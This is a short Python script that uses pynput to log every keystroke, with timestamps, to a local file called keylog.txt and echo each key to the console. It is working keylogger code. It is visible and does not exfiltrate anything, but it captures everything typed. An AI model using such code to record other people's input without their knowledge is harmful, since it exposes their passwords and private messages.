from pynput import keyboard
import time

def on_key_press(key):
    # Print key to the console for debugging
    try:
        print(f"Key pressed: {key.char}")  # This should show the character if it's a regular key
    except AttributeError:
        print(f"Special key pressed: {key}")  # Handles special keys like space, enter, etc.

    # Log the key to the file with a timestamp
    with open("keylog.txt", "a") as log_file:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
        try:
            log_file.write(f"{timestamp} - {key.char}\n")
        except AttributeError:
            log_file.write(f"{timestamp} - {key}\n")

def main():
    print("Press Ctrl+C to stop logging.")
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
